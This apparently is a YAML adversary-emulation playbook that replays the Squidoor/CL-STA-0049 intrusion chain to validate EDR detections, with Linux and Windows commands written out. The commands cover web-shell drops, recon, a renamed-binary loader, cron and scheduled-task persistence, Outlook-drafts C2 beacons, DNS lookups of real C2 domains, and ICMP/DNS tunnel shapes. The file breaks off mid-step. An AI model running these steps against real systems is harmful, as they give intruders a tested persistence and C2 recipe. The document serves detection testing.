  - name: cortexsim-eal-cli
    source: "https://github.com/hankthebldr/cortex-pov-engine"
    type: script
    install_inline: false

steps:
  - id: step-01
    name: "Decode .aspx web shells into the webroot and run recon from the web-service account"
    command: |
      STAGE=/tmp/cortexsim-mp023
      WEBROOT="${WEBROOT:-$STAGE/www}"
      mkdir -p "$WEBROOT" "$STAGE/drop"
      printf "%s" "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlLS0gQ29ydGV4U2ltIFNJTS1NUC0wMjMgaW5lcnQgd2ViLXNoZWxsIHN0YW5kLWluOiBubyBjb2RlLCBubyBoYW5kbGVyIC0tJT4=" > "$STAGE/drop/TimeoutAPI.b64"
      base64 -d "$STAGE/drop/TimeoutAPI.b64" > "$WEBROOT/TimeoutAPI.aspx"
      cp "$WEBROOT/TimeoutAPI.aspx" "$WEBROOT/OutlookDC.aspx"
      cp "$WEBROOT/TimeoutAPI.aspx" "$WEBROOT/Error.aspx"
      sh -c "id; hostname; uname -a; ls -la $WEBROOT" > "$STAGE/drop/webshell-exec.out" 2>&1
      echo cortexsim-mp023-step01-webshells-decoded-and-executed
    identity: www-data
    mitre_technique: "T1505.003"
    # Root of the causality spine — links from the CGO (web-server worker).
    platforms: ["linux", "windows"]
    platform_variants:
      windows: |
        $s = 'C:\ProgramData\cortexsim-mp023'
        $w = "$s\wwwroot"
        New-Item -ItemType Directory -Force -Path $w | Out-Null
        Set-Content -Path "$s\TimeoutAPI.b64" -Value 'PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlLS0gQ29ydGV4U2ltIFNJTS1NUC0wMjMgaW5lcnQgd2ViLXNoZWxsIHN0YW5kLWluOiBubyBjb2RlLCBubyBoYW5kbGVyIC0tJT4='
        certutil -f -decode "$s\TimeoutAPI.b64" "$w\TimeoutAPI.aspx"
        Copy-Item "$w\TimeoutAPI.aspx" "$w\OutlookDC.aspx" -Force
        Copy-Item "$w\TimeoutAPI.aspx" "$w\Error.aspx" -Force
        cmd.exe /c "whoami & hostname & ver"
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A web-service account (www-data / IIS app-pool identity) decodes base64 content into .aspx files named like the CL-STA-0049 web shells (OutlookDC.aspx, Error.aspx, TimeoutAPI.aspx) in a webroot — certutil -decode on Windows, base64 -d on Linux."
        ttp_ref: "TTP-2026-0182"
        detection_id: "bioc-mp-023-web-service-account-decodes-aspx-web-shell-into-webroot"
      - plane: EDR
        type: XQL
        description: "Validation query: the web-service account wrote the three .aspx files and then spawned a shell running id / hostname / uname (or whoami / hostname / ver) inside the run window."
        ttp_ref: "TTP-2026-0182"
        detection_id: "xql-mp-023-web-shell-write-followed-by-recon-shell-from-web-service-account"

  - id: step-02
    name: "Disguise a web shell as a certificate and push it to a peer server with curl"
    command: |
      STAGE=/tmp/cortexsim-mp023
      WEBROOT="${WEBROOT:-$STAGE/www}"
      cp "$WEBROOT/Error.aspx" "$STAGE/drop/server.crt"
      head -c 64 "$STAGE/drop/server.crt" > "$STAGE/drop/crt-head.out"
      curl -s --max-time 5 -T "$STAGE/drop/server.crt" "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/upload/server.crt" -o /dev/null || true
      echo cortexsim-mp023-step02-webshell-disguised-as-cert-and-pushed
    identity: www-data
    mitre_technique: "T1036.008"
    causality:
      parent_step: step-01
      pivot: process_lineage
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A web-service account copies an .aspx script to a .crt filename (script content behind a certificate extension) and uploads it with curl -T to an internal peer — the report's web-shell-as-certificate spread."
        ttp_ref: "TTP-2026-0182"
        detection_id: "bioc-mp-023-aspx-web-shell-copied-to-certificate-extension-and-uploaded"

  - id: step-03
    name: "Renamed system binary (fontdrvhost) executes a config.ini payload script — host recon"
    command: |
      STAGE=/tmp/cortexsim-mp023
      mkdir -p "$STAGE/ProgramData"
      cp /bin/sh "$STAGE/ProgramData/fontdrvhost"
      chmod 755 "$STAGE/ProgramData/fontdrvhost"
      printf "id\nhostname\nuname -a\nip -4 addr show\nps -eo pid,user,comm --no-headers\n" > "$STAGE/ProgramData/config.ini"
      "$STAGE/ProgramData/fontdrvhost" "$STAGE/ProgramData/config.ini" > "$STAGE/drop/squidoor-recon.out" 2>&1
      echo cortexsim-mp023-step03-renamed-loader-ran-config-ini
    identity: www-data
    mitre_technique: "T1127"
    causality:
      parent_step: step-01
      pivot: process_lineage
    platforms: ["linux", "windows"]
    platform_variants:
      windows: |
        $p = 'C:\ProgramData\cortexsim-mp023'
        New-Item -ItemType Directory -Force -Path $p | Out-Null
        $cdb = @("${env:ProgramFiles(x86)}\Windows Kits\10\Debuggers\x64\cdb.exe", "$env:ProgramFiles\Windows Kits\10\Debuggers\x64\cdb.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
        Set-Content -Path "$p\config.ini" -Value '.echo cortexsim-mp023-config-ini; q'
        if ($cdb) { Copy-Item $cdb "$p\fontdrvhost.exe" -Force; & "$p\fontdrvhost.exe" -cf "$p\config.ini" "$env:SystemRoot\System32\whoami.exe" }
        else { Copy-Item "$env:SystemRoot\System32\whoami.exe" "$p\fontdrvhost.exe" -Force; & "$p\fontdrvhost.exe" /all }
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A process whose image name is fontdrvhost runs from a ProgramData-style path rather than System32, its binary hash/original name being a different system binary (cdb.exe on Windows, sh on the Linux path), with config.ini as its argument — the report's renamed-cdb Squidoor loader. The Windows variant stages fontdrvhost.exe and config.ini under C:\\ProgramData\\cortexsim-mp023\\, a near-analogue of the report's C:\\ProgramData\\fontdrvhost.exe, so no pre-existing ProgramData file is touched."
        ttp_ref: "TTP-2026-0182"
        detection_id: "bioc-mp-023-renamed-system-binary-fontdrvhost-executes-config-ini-from-programdata"
      - plane: EDR
        type: XQL
        description: "Validation query: the renamed fontdrvhost process spawned host-reconnaissance children (id/hostname/uname/ip/ps, or whoami) — Squidoor's fingerprinting of user, host, IP and OS."
        ttp_ref: "TTP-2026-0182"
        detection_id: "xql-mp-023-renamed-fontdrvhost-spawns-host-reconnaissance"

  - id: step-04
    name: "Persist the loader as EPolicyManager (cron @reboot; Windows scheduled task)"
    command: |
      STAGE=/tmp/cortexsim-mp023
      crontab -l > "$STAGE/drop/crontab.before" 2>/dev/null
      ( cat "$STAGE/drop/crontab.before"; echo "@reboot $STAGE/ProgramData/fontdrvhost $STAGE/ProgramData/config.ini # EPolicyManager cortexsim-mp023" ) | crontab -
      crontab -l > "$STAGE/drop/crontab.after"
      echo cortexsim-mp023-step04-epolicymanager-persistence-installed
    identity: www-data
    mitre_technique: "T1053.003"
    causality:
      parent_step: step-03
      pivot: process_lineage
    platforms: ["linux", "windows"]
    platform_variants:
      windows: |
        # Creating a task under \Microsoft\Windows\AppID needs an elevated beacon; /ru is omitted so the task runs as the beacon's own account.
        schtasks.exe /create /f /tn "Microsoft\Windows\AppID\EPolicyManager" /sc onstart /tr "C:\ProgramData\cortexsim-mp023\fontdrvhost.exe -cf C:\ProgramData\cortexsim-mp023\config.ini C:\Windows\System32\whoami.exe"
        schtasks.exe /query /tn "Microsoft\Windows\AppID\EPolicyManager" /v /fo list
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A persistence entry named EPolicyManager whose action launches the renamed fontdrvhost binary from a ProgramData-style path — a scheduled task under Microsoft\\Windows\\AppID on Windows (the report's task), a service-account crontab @reboot entry on Linux."
        ttp_ref: "TTP-2026-0182"
        detection_id: "bioc-mp-023-epolicymanager-persistence-launching-renamed-fontdrvhost"

  - id: step-05
    name: "Squidoor C2 channels: Outlook-drafts beacon shape, Pastebin check-in, report-domain DNS lookups"
    command: |
      STAGE=/tmp/cortexsim-mp023
      mkdir -p "$STAGE/Explorer/UUID"
      printf "%s\n" "graph_refresh_token=CORTEXSIM-INERT-NOT-A-TOKEN" > "$STAGE/Explorer/UUID/7d3c2a10-cortexsim-mp023"
      cat > "$STAGE/drop/draft-beacon.json" <<JSON
      {"subject":"p_4711","isDraft":true,"body":{"contentType":"Text","content":"Y29ydGV4c2ltLW1wMDIzLWluZXJ0LWJlYWNvbg=="}}
      JSON
      curl -s --max-time 5 "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/raw/Local365" -o "$STAGE/drop/local365.txt" || true
      curl -s --max-time 5 -X POST -H "Content-Type: application/json" --data @"$STAGE/drop/draft-beacon.json" "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/v1.0/me/mailFolders/drafts/messages" -o /dev/null || true
      curl -s --max-time 5 "http://${STAGE_HOST:-127.0.0.1}:${STAGE_PORT:-8080}/v1.0/me/mailFolders/drafts/messages?\$filter=startswith(subject,%27r_4711%27)" -o /dev/null || true
      dig +short support.vmphere.com @${LAB_RESOLVER:-127.0.0.53}
      dig +short update.hobiter.com @${LAB_RESOLVER:-127.0.0.53}
      dig +short microsoft-beta.com @${LAB_RESOLVER:-127.0.0.53}
      dig +short zimbra-beta.info @${LAB_RESOLVER:-127.0.0.53}
      dig +short microsoftapimap.com @${LAB_RESOLVER:-127.0.0.53}
      echo cortexsim-mp023-step05-c2-channel-shapes-and-report-domain-lookups
    identity: www-data
    mitre_technique: "T1102"
    causality:
      parent_step: step-03
      pivot: process_lineage
    platforms: ["linux", "windows"]
    # The five IOC (report-domain DNS) rows below are Linux-only: this Windows variant omits the lookups (nslookup takes no @resolver).
    platform_variants:
      windows: |
        $k = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UUID\7d3c2a10-cortexsim-mp023'
        New-Item -Path $k -Force | Out-Null
        Set-ItemProperty -Path $k -Name 'token' -Value 'CORTEXSIM-INERT-NOT-A-TOKEN'
        $h = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
        $port = if ($env:STAGE_PORT) { $env:STAGE_PORT } else { '8080' }
        $body = '{"subject":"p_4711","isDraft":true,"body":{"contentType":"Text","content":"Y29ydGV4c2ltLW1wMDIzLWluZXJ0LWJlYWNvbg=="}}'
        try { Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Uri "http://${h}:${port}/raw/Local365" | Out-Null } catch {}
        try { Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Method Post -ContentType 'application/json' -Body $body -Uri "http://${h}:${port}/v1.0/me/mailFolders/drafts/messages" | Out-Null } catch {}
    expected_detections:
      - plane: EDR
        type: IOC
        description: "DNS query for support.vmphere.com — a published CL-STA-0049 Squidoor C2 domain; Unit 42 threat intel enriches the alert with the actor."
        ttp_ref: "TTP-2026-0182"
        detection_id: "ioc-domain-support-vmphere-com"
      - plane: EDR
        type: IOC
        description: "DNS query for update.hobiter.com — a published CL-STA-0049 Squidoor C2 domain."
        ttp_ref: "TTP-2026-0182"
        detection_id: "ioc-domain-update-hobiter-com"
      - plane: EDR
        type: IOC
        description: "DNS query for microsoft-beta.com — a published CL-STA-0049 Squidoor C2 domain."
        ttp_ref: "TTP-2026-0182"
        detection_id: "ioc-domain-microsoft-beta-com"
      - plane: EDR
        type: IOC
        description: "DNS query for zimbra-beta.info — a published CL-STA-0049 Squidoor C2 domain."
        ttp_ref: "TTP-2026-0182"
        detection_id: "ioc-domain-zimbra-beta-info"
      - plane: EDR
        type: IOC
        description: "DNS query for microsoftapimap.com — a published CL-STA-0049 Squidoor C2 domain."
        ttp_ref: "TTP-2026-0182"
        detection_id: "ioc-domain-microsoftapimap-com"
      - plane: EDR
        type: XQL
        description: "Validation query: a web-service-account process (child of the renamed loader) issued Graph mailFolders/drafts requests with p_/r_ subject filters and resolved several published CL-STA-0049 domains in one burst."
        ttp_ref: "TTP-2026-0182"
        detection_id: "xql-mp-023-service-account-outlook-drafts-c2-shape-and-report-domain-burst"

  - id: step-06
    name: "ICMP tunnel shape (padded echo payload) and long-label DNS tunnel queries to a lab zone"
    command: |
      STAGE=/tmp/cortexsim-mp023
      ping -c 4 -s 512 -p 6d703032332d69636d70 "${STAGE_HOST:-127.0.0.1}" > "$STAGE/drop/icmp.out" 2>&1
      for i in 1 2 3 4 5 6; do dig +short "$(head -c 30 /dev/urandom | base32 | tr -d = | tr A-Z a-z).t.cortexsim-canary.invalid" @${LAB_RESOLVER:-127.0.0.53}; done
      echo cortexsim-mp023-step06-icmp-and-dns-tunnel-shapes
    identity: www-data
    mitre_technique: "T1095"
    causality:
      parent_step: step-05
      pivot: process_lineage
    platforms: ["linux", "windows"]
    platform_variants:
      windows: |
        $h = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
        ping.exe -n 4 -l 512 $h
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A non-interactive service account runs ping with an oversized payload (-s/-l 512) and a custom fill pattern (-p) — Squidoor's ICMP-tunnel transport shape (CIcmpTransChannel)."
        ttp_ref: "TTP-2026-0182"
        detection_id: "bioc-mp-023-service-account-ping-with-oversized-patterned-icmp-payload"
      - plane: EDR
        type: XQL
        description: "Validation query: the same service account issued a burst of DNS queries with long base32-shaped leftmost labels under one zone — the CDnsTransChannel tunnelling shape."
        ttp_ref: "TTP-2026-0182"
        detection_id: "xql-mp-023-long-label-dns-query-burst-from-service-account"

  - id: step-07
    name: "NGFW EAL leg: recurring beacon from the run host to the published domains/IPs"
    command: |
      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
      SRC_IP=$(hostname -I | awk '{print $1}')
      SRC_HOST=$(hostname -s)
      SRC_USER=$(id -un www-data 2>/dev/null || id -un)
      cat > /tmp/mp-023-ngfw-eal.yml <<YML
      campaign_id: CMP-MP-023
      name: "Squidoor C2 egress from the run host to published CL-STA-0049 infrastructure"
      authorized_by: "domain-consultant@paloaltonetworks.com"
      simulation_authorized: true
      c2_authorized: true
      target_allowlist:
        - "$COLLECTOR_HOST"
      dry_run: false
      tags: [mp-023, squidoor, cl-sta-0049, ngfw-eal]
      steps:
        - step_id: step-01
          plugin: ngfw_eal_emitter
          params:
            collector_url: "$COLLECTOR_URL"
            event_pattern: abnormal_recurring_comms
            burst_count: 8
            iterations: 1
            dst_domain: "support.vmphere.com"
            dst_ip: "209.141.40.254"
